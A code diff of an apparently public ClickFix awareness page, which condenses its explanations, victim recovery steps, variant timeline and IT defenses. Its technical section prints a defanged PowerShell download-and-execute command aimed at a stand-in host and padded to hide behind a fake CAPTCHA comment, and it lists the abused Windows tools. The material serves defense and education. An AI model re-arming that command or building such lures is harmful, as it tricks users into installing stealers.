@@ -3,116 +3,79 @@ import Layout from "../layouts/Layout.astro";
 import Header from "../components/Header.astro";
 import Footer from "../components/Footer.astro";
 import Demo from "../components/Demo.astro";
+import Lures from "../components/Lures.astro";
 import Reading from "../components/Reading.astro";
 
 const reviewed = "November 2026";
 
 const keys = [
   { caps: ["Win", "R"], does: "opens the Run box" },
-  { caps: ["Ctrl", "V"], does: "pastes what the page copied" },
+  { caps: ["Ctrl", "V"], does: "pastes the attacker’s command" },
   { caps: ["Enter"], does: "runs it" },
-];
-
-const lures = [
-  {
-    name: "A human check",
-    says: "“Verify you are human.” “I’m not a robot.”",
-    detail: "Often styled to look like Cloudflare or Google reCAPTCHA. Clicking the checkbox copies the command.",
-  },
-  {
-    name: "A page or browser error",
-    says: "“This page can’t be displayed. Click Fix it.” “Update your browser to view this document.”",
-    detail: "Shown on top of a real-looking site or document.",
-  },
-  {
-    name: "A video call that won’t work",
-    says: "“Your microphone isn’t working.” “Fix your camera to join.”",
-    detail: "A fake Google Meet, Zoom or Teams page, often sent as a meeting invite.",
-  },
-  {
-    name: "A Windows update screen",
-    says: "“Finish installing this update.”",
-    detail: "The browser goes full screen and imitates Windows Update, then asks you to run a command to complete it.",
-  },
-  {
-    name: "A broken browser",
-    says: "“Your browser stopped unexpectedly. Run this repair.”",
-    detail: "A fake extension makes the browser freeze, then offers the “fix” (CrashFix).",
-  },
-  {
-    name: "A file path to paste",
-    says: "“Copy this file path and paste it into File Explorer.”",
-    detail: "The “path” is a command with a fake path stuck on the end (FileFix).",
-  },
-  {
-    name: "A sign-in link to paste back",
-    says: "“Sign in, then copy the address from your browser and paste it here.”",
-    detail: "That address holds a key to your Microsoft account. No malware is involved, but the attacker gets in (ConsentFix).",
-  },
 ];
 
 const timeline = [
   {
-    when: "Mar–May 2024",
+    when: "2024",
     name: "ClickFix appears",
-    what: "PowerShell pasted into the Run box or a PowerShell window, from fake Word and Chrome errors.",
+    what: "Fake Word and Chrome errors; PowerShell pasted into Run.",
     source: "Proofpoint",
     url: "https://www.proofpoint.com/us/blog/threat-insight/security-brief-clickfix-social-engineering-technique-floods-threat-landscape",
   },
   {
-    when: "Oct 2024 – Feb 2025",
-    name: "Government hackers try it",
-    what: "Groups linked to Russia (APT28), North Korea (Kimsuky) and Iran (MuddyWater) use it in espionage campaigns.",
+    when: "Late 2024",
+    name: "State hackers adopt it",
+    what: "Russia’s APT28, North Korea’s Kimsuky, Iran’s MuddyWater.",
     source: "Proofpoint",
     url: "https://www.proofpoint.com/us/blog/threat-insight/around-world-90-days-state-sponsored-actors-try-clickfix",
   },
   {
     when: "Jun 2025",
     name: "FileFix",
-    what: "A command disguised as a file path, pasted into File Explorer’s address bar. Published as a proof of concept, then seen in real attacks.",
+    what: "Command disguised as a file path, pasted into File Explorer.",
     source: "Kaspersky",
     url: "https://www.kaspersky.com/blog/filefix-attack-windows-file-explorer/54752/",
   },
   {
     when: "2025",
-    name: "Macs targeted",
-    what: "Encoded <code>curl … | bash</code> one-liners pasted into Terminal, mostly delivering Atomic Stealer.",
+    name: "Macs",
+    what: "Encoded one-liners pasted into Terminal; mostly Atomic Stealer.",
     source: "Microsoft",
     url: "https://www.microsoft.com/en-us/security/blog/2025/08/21/think-before-you-clickfix-analyzing-the-clickfix-social-engineering-technique/",
   },
   {
     when: "Dec 2025",
     name: "ConsentFix",
-    what: "The victim pastes a <code>localhost</code> URL containing an OAuth authorization code from an Azure CLI sign-in. Nothing runs locally; the account is taken over.",
+    what: "Victim pastes back an OAuth sign-in URL. Account takeover, no malware.",
     source: "Push Security",
     url: "https://pushsecurity.com/blog/consentfix-debrief",
   },
   {
     when: "Jan 2026",
     name: "CrashFix",
-    what: "A fake ad-blocker extension crashes the browser. The “fix” abuses <code>finger.exe</code> to fetch a Python remote access trojan.",
+    what: "Fake extension crashes the browser; the “fix” abuses <code>finger.exe</code>.",
     source: "Microsoft",
     url: "https://www.microsoft.com/en-us/security/blog/2026/02/05/clickfix-variant-crashfix-deploying-python-rat-trojan/",
   },
   {
     when: "Feb 2026",
     name: "Windows Terminal",
-    what: "<kbd>Win</kbd> + <kbd>X</kbd>, then <kbd>I</kbd> opens Windows Terminal instead of the Run box, getting around policies that only restrict Run. Delivered Lumma Stealer.",
-    source: "SecurityWeek, on Microsoft findings",
+    what: "<kbd>Win</kbd> + <kbd>X</kbd>, <kbd>I</kbd> instead of Run, dodging Run-box policies.",
+    source: "SecurityWeek",
     url: "https://www.securityweek.com/clickfix-attack-uses-windows-terminal-to-evade-detection/",
   },
   {
     when: "Mar 2026",
-    name: "macOS pushes back",
-    what: "macOS Tahoe 26.4 warns when a command copied from the web is pasted into Terminal, and blocks known malware outright.",
-    source: "MacRumors, on Apple’s documentation",
+    name: "macOS warns",
+    what: "Tahoe 26.4 flags commands pasted into Terminal from the web.",
+    source: "MacRumors",
     url: "https://www.macrumors.com/2026/06/16/apple-details-terminal-anti-scam-warning-in-macos/",
   },
   {
     when: "Oct 2026",
     name: "Cache smuggling",
-    what: "The page loads the payload into the browser cache disguised as an image. The short Run-box command finds and runs it, so there’s no download to detect.",
-    source: "iTnews, on Microsoft findings",
+    what: "Payload pre-loaded into the browser cache; no download event.",
+    source: "iTnews",
     url: "https://www.itnews.com.au/news/microsoft-spots-new-twist-on-clickfix-cache-smuggling-629401",
   },
 ];
@@ -120,7 +83,7 @@ const timeline = [
 
 <Layout
   title="ClickFix: no real website will ask you to press these keys"
-  description="ClickFix pages trick you into pasting a command that installs malware. See how it works with a safe demo, learn what the trap looks like, and what to do if you already ran it."
+  description="ClickFix pages trick you into pasting a command that installs malware. Try a safe demo, see what the trap looks like, and what to do if you ran one."
 >
   <Header />
 
@@ -144,136 +107,60 @@ const timeline = [
         ))}
       </ol>
 
-      <div class="hero-text measure">
+      <div class="measure">
         <p class="lead">
-          If a CAPTCHA, error message or “fix” tells you to open a box on your computer and paste something into it,
-          close the page. It’s a scam called ClickFix, and following the steps installs the attacker’s malware.
+          If a page asks you to, close it. It’s a scam called ClickFix, and that command installs malware.
         </p>
-        <p class="mac-note">
-          On a Mac, the page asks you to open Terminal and press <kbd>⌘</kbd> + <kbd>V</kbd>. Same scam.
-        </p>
+        <p class="mac-note">On a Mac it’s Terminal and <kbd>⌘</kbd> + <kbd>V</kbd>. Same scam.</p>
         <p class="hero-links">
-          <a class="go" href="#demo">Try a safe version</a>
-          <a class="urgent" href="#ran-it">I already did it</a>
+          <a class="go" href="#demo">Try a safe demo</a>
+          <a class="urgent" href="#ran-it">Ran a command? Do this now</a>
         </p>
       </div>
-    </section>
-
-    <section class="block wrap" id="what" aria-labelledby="what-title">
-      <h2 id="what-title">What ClickFix is</h2>
-      <div class="measure prose">
-        <p>
-          ClickFix gets you to install malware yourself. A web page shows you something familiar: a “verify you’re
-          human” check, a browser error, a video call that won’t connect, a document that won’t open. When you click,
-          the page quietly copies a command to your clipboard. Then it tells you how to “fix” the problem: open a box
-          on your computer, paste, press Enter.
-        </p>
-        <p>
-          That box runs whatever you paste. The command downloads malware, usually a stealer that takes saved
-          passwords, logged-in sessions and crypto wallets. On work computers it often installs remote-access tools
-          that give the attacker a way into the company network.
-        </p>
-        <p>
-          It works because nothing looks wrong. There’s no file to download or attachment to open, and the program
-          that runs the command is part of Windows or macOS. It first appeared in 2024 and is now one of the most
-          common ways attackers get in. Microsoft’s 2025 Digital Defense Report ranked it first, ahead of ordinary
-          phishing.
-        </p>
-      </div>
-      <p class="rule">
-        A website can’t fix your computer by having you paste something. Not a CAPTCHA, not a browser update, not a
-        meeting app, not tech support.
-      </p>
     </section>
 
     <section class="block wrap" id="demo" aria-labelledby="demo-title">
-      <h2 id="demo-title">Try it safely</h2>
-      <p class="measure intro">
-        Here’s the scam step by step, on a fake page. The only thing it does to your computer is put a harmless line
-        of text on your clipboard. If that text ends up somewhere that runs commands, it prints a message and stops.
-        It doesn’t download anything.
-      </p>
+      <h2 id="demo-title">See how it works</h2>
+      <p class="measure">A fake page and a harmless command. Nothing gets downloaded.</p>
       <Demo />
     </section>
 
     <section class="block wrap" id="looks" aria-labelledby="looks-title">
-      <h2 id="looks-title">What the trap looks like</h2>
-      <p class="measure intro">
-        The disguise changes constantly; the request doesn’t. These are the ones seen most often. They turn up on
-        hacked websites you’d normally trust, in search ads, on fake download pages and in emails.
-      </p>
-      <dl class="lures">
-        {lures.map((lure) => (
-          <div>
-            <dt>{lure.name}</dt>
-            <dd class="says">{lure.says}</dd>
-            <dd>{lure.detail}</dd>
-          </div>
-        ))}
-      </dl>
+      <h2 id="looks-title">What it looks like</h2>
+      <p class="measure">The disguise changes. The ask doesn’t: copy something, paste it into your computer.</p>
+      <Lures />
     </section>
 
     <section class="ran" id="ran-it" aria-labelledby="ran-title">
       <div class="wrap">
-        <h2 id="ran-title">If you already ran it</h2>
-        <div class="measure prose">
-          <p>
-            Assume the attacker now has what was on that computer: saved passwords, logged-in accounts and files.
-            Act now. The steps below take an hour or two.
-          </p>
-          <p class="relief">
-            Pasted but never pressed <kbd>Enter</kbd>? Then nothing ran. Close the box and you’re fine. The same goes
-            for anything you pasted into the practice box on this page.
-          </p>
-        </div>
+        <h2 id="ran-title">If you ran a command</h2>
+        <p class="measure relief">
+          Pasted but never pressed <kbd>Enter</kbd>? Nothing ran. Close the box.
+        </p>
 
         <div class="ran-grid">
           <section aria-labelledby="ran-work">
-            <h3 id="ran-work">On a work computer</h3>
+            <h3 id="ran-work">Work computer</h3>
             <ol class="steps">
-              <li>
-                <strong>Disconnect it from the network.</strong> Turn off Wi-Fi or unplug the cable. Don’t shut it
-                down or try to clean it; your IT team may need what’s on it.
-              </li>
-              <li>
-                <strong>Tell IT or security right away,</strong> by phone or from another device. Say which page you
-                were on, what you pasted and when. They see this often, and every minute counts more than any
-                embarrassment.
-              </li>
-              <li><strong>Follow their instructions</strong> for passwords and accounts.</li>
+              <li><strong>Disconnect from the network.</strong> Don’t shut it down.</li>
+              <li><strong>Call IT or security now.</strong> Tell them what you pasted and when.</li>
             </ol>
           </section>
 
           <section aria-labelledby="ran-home">
-            <h3 id="ran-home">On a personal computer</h3>
+            <h3 id="ran-home">Personal computer</h3>
             <ol class="steps">
-              <li><strong>Disconnect it from the internet.</strong> Turn off Wi-Fi or unplug the cable.</li>
+              <li><strong>Disconnect from the internet.</strong></li>
               <li>
-                <strong>Use a different device for everything below.</strong> Anything you type on the affected
-                computer could be recorded.
+                <strong>On another device, secure your email:</strong> new password, then “sign out of all devices”.
+                A new password alone won’t kick the attacker out.
               </li>
               <li>
-                <strong>Secure your email first.</strong> Change the password, then use “sign out of all devices”.
-                Stealers copy the sessions you’re already logged in to, so a new password alone doesn’t lock the
-                attacker out.
+                <strong>Do the same for</strong> your password manager, bank, and Apple, Google or Microsoft account.
+                Turn on two-step verification.
               </li>
-              <li>
-                <strong>Then everything else, most important first:</strong> password manager, bank and payment
-                accounts, your Apple, Google or Microsoft account, then social media. For each: new password, sign out
-                everywhere, turn on two-step verification.
-              </li>
-              <li>
-                <strong>Move any cryptocurrency</strong> that computer could reach to a new wallet set up on a clean
-                device. Stealers go for wallets first and empty them fast.
-              </li>
-              <li>
-                <strong>Reset the computer.</strong> Back up your documents and photos (not programs), then erase it
-                and reinstall the operating system. A clean antivirus scan doesn’t prove the malware is gone.
-              </li>
-              <li>
-                <strong>Watch your accounts</strong> and bank statements for the next few weeks, and tell your bank
-                about anything you don’t recognize.
-              </li>
+              <li><strong>Move any crypto</strong> to a new wallet made on a clean device.</li>
+              <li><strong>Back up your files, then erase and reinstall</strong> the computer.</li>
             </ol>
           </section>
         </div>
@@ -282,57 +169,18 @@ const timeline = [
 
     <section class="block wrap tech" id="for-it" aria-labelledby="it-title">
       <h2 id="it-title">For IT and security teams</h2>
-      <p class="measure intro">
-        The technical version: how the chain works, how it has changed since 2024, and what actually reduces the
-        risk.
-      </p>
-
-      <h3>The chain</h3>
-      <ol class="chain measure">
-        <li>
-          <strong>Delivery.</strong> JavaScript injected into compromised sites (often WordPress), malicious ads and
-          poisoned search results, phishing with HTML attachments or links, fake software and GitHub pages.
-        </li>
-        <li>
-          <strong>Clipboard write.</strong> A click on the fake checkbox or button calls
-          <code>navigator.clipboard.writeText()</code>. Browsers allow this on any user click, with no prompt.
-        </li>
-        <li>
-          <strong>Execution surface.</strong> The victim opens the Run box (<kbd>Win</kbd> + <kbd>R</kbd>), Windows
-          Terminal (<kbd>Win</kbd> + <kbd>X</kbd>, <kbd>I</kbd>), File Explorer’s address bar, PowerShell, or macOS
-          Terminal, and pastes.
-        </li>
-        <li>
-          <strong>Command.</strong> A built-in tool fetches stage two: <code>powershell</code> with
-          <code>iwr</code>/<code>irm</code> piped to <code>iex</code>, <code>mshta</code>, <code>curl</code>,
-          <code>finger</code>, <code>net use</code> to a WebDAV share, or <code>cmd</code> launching
-          <code>wscript</code>. On Windows it’s usually padded with spaces and a trailing comment, so the Run box
-          shows only the comment.
-        </li>
-        <li>
-          <strong>Payload.</strong> Mostly infostealers (Lumma, Vidar, StealC, and Atomic Stealer on macOS), loaders,
-          and remote access tools such as AsyncRAT and NetSupport, which can lead to ransomware.
-        </li>
-      </ol>
 
       <figure class="sample">
         <pre><code>powershell -w h -c "iwr hxxps://cdn-check[.]example/v.ps1 | iex"                                        # ✅ I am not a robot - Verification ID: 4821</code></pre>
         <figcaption>
-          A representative command, defanged so it can’t run. <code>-w h</code> hides the window. The Run box is
-          too narrow to show anything but the comment at the end.
+          Typical Windows payload, defanged. Hidden window, download-and-execute, padded so the Run box shows only
+          the comment.
         </figcaption>
       </figure>
 
-      <h3>How it has changed</h3>
+      <h3>Timeline</h3>
       <div class="table-scroll" role="region" aria-label="ClickFix timeline" tabindex="0">
         <table class="timeline">
-          <thead>
-            <tr>
-              <th scope="col">When</th>
-              <th scope="col">What changed</th>
-              <th scope="col">Source</th>
-            </tr>
-          </thead>
           <tbody>
             {timeline.map((row) => (
               <tr>
@@ -347,46 +195,31 @@ const timeline = [
         </table>
       </div>
 
-      <h3>What reduces the risk</h3>
+      <h3>Defenses</h3>
       <ul class="defenses measure">
+        <li><strong>Train one rule:</strong> no legitimate site asks you to paste into Run, Terminal or an address bar.</li>
         <li>
-          <strong>Train one rule, not a gallery of lures.</strong> The disguises change weekly. “No legitimate site
-          asks you to paste anything into Run, Terminal or an address bar” doesn’t.
+          <strong>Disable the Run box</strong> (<code>NoRun</code>) where unneeded, knowing Terminal and Explorer stay
+          open.
         </li>
         <li>
-          <strong>Remove the Run box where people don’t need it</strong> (Group Policy “Remove Run menu from Start
-          Menu”, or the <code>NoRun</code> registry value). This closes one door only: Windows Terminal, PowerShell
-          and File Explorer’s address bar stay open, and attackers have already moved to them.
+          <strong>Block LOLBins users don’t need</strong> with App Control or AppLocker: <code>mshta</code>,
+          <code>wscript</code>, <code>finger</code>, PowerShell.
         </li>
         <li>
-          <strong>Use application control</strong> (App Control for Business or AppLocker) to block the tools that
-          standard users never need: <code>mshta</code>, <code>wscript</code>/<code>cscript</code>,
-          <code>finger</code>, and PowerShell for people who don’t use it. Where PowerShell stays, enforce Constrained
-          Language Mode and turn on script block logging.
+          <strong>Hunt</strong> <code>explorer.exe</code>/<code>WindowsTerminal.exe</code> spawning shells with
+          network activity, <code>RunMRU</code> entries, outbound TCP 79, new WebDAV mounts.
         </li>
         <li>
-          <strong>Keep Macs on macOS 26.4 or later</strong> so Terminal warns about pasted commands. Windows has no
-          equivalent for the Run box. Windows Terminal’s paste warnings only cover multi-line and very large pastes,
-          not a one-line command.
+          <strong>Devalue stolen sessions:</strong> phishing-resistant MFA, token protection, no browser-saved
+          passwords. Restrict Azure CLI sign-ins against ConsentFix.
         </li>
-        <li>
-          <strong>Hunt where the activity is.</strong> <code>explorer.exe</code> or <code>WindowsTerminal.exe</code>
-          starting <code>powershell</code>, <code>mshta</code> or <code>cmd</code> that then makes network
-          connections; the <code>RunMRU</code> registry key
-          (<code>HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU</code>), which records Run-box
-          commands; outbound TCP 79 (finger); and new WebDAV mounts. Cache-smuggling variants create no download
-          event, so don’t rely on one.
-        </li>
-        <li>
-          <strong>Make stolen sessions worth less.</strong> Use phishing-resistant MFA and token protection, turn
-          off browser password saving on managed devices, and keep session lifetimes short. For ConsentFix, restrict
-          or monitor sign-ins to Azure CLI and other first-party Microsoft apps with Conditional Access.
-        </li>
+        <li><strong>Keep Macs on macOS 26.4+</strong> for Terminal’s paste warning.</li>
       </ul>
     </section>
 
     <section class="block wrap" id="reading" aria-labelledby="reading-title">
-      <h2 id="reading-title">Sources and further reading</h2>
+      <h2 id="reading-title">Sources</h2>
       <div class="measure">
         <Reading />
       </div>
@@ -507,54 +340,6 @@ const timeline = [
     margin: 3rem 0 1rem;
   }
 
-  .intro {
-    color: var(--ink);
-  }
-
-  .prose p + p {
-    margin-top: 1rem;
-  }
-
-  .rule {
-    max-width: 30ch;
-    margin-top: 2.5rem;
-    border-left: 5px solid var(--stop);
-    padding-left: 1.25rem;
-    font-size: clamp(1.4rem, 3vw, 2rem);
-    font-weight: 560;
-    line-height: 1.25;
-    text-wrap: balance;
-  }
-
-  /* ---------- Lures ---------- */
-  .lures {
-    display: grid;
-    grid-template-columns: repeat(auto-fill, minmax(min(100%, 19rem), 1fr));
-    gap: 2rem 2.5rem;
-    margin: 2.25rem 0 0;
-  }
-
-  .lures > div {
-    border-top: 1px solid var(--rule);
-    padding-top: 0.9rem;
-  }
-
-  .lures dt {
-    font-weight: 620;
-  }
-
-  .lures dd {
-    margin: 0.35rem 0 0;
-    color: var(--muted);
-    font-size: 1rem;
-    line-height: 1.5;
-  }
-
-  .lures .says {
-    color: var(--ink);
-    font-style: italic;
-  }
-
   /* ---------- If you ran it ---------- */
   .ran {
     margin-top: clamp(3.5rem, 9vw, 6.5rem);
@@ -568,8 +353,7 @@ const timeline = [
   }
 
   .relief {
-    border-left: 3px solid var(--ink);
-    padding-left: 1rem;
+    font-size: 1.15rem;
   }
 
   .ran-grid {
@@ -595,7 +379,6 @@ const timeline = [
   }
 
   /* ---------- Technical ---------- */
-  .chain,
   .defenses {
     display: grid;
     gap: 0.9rem;
@@ -603,7 +386,7 @@ const timeline = [
   }
 
   .sample {
-    margin-top: 2rem;
+    margin-top: 1.5rem;
   }
 
   .sample pre {
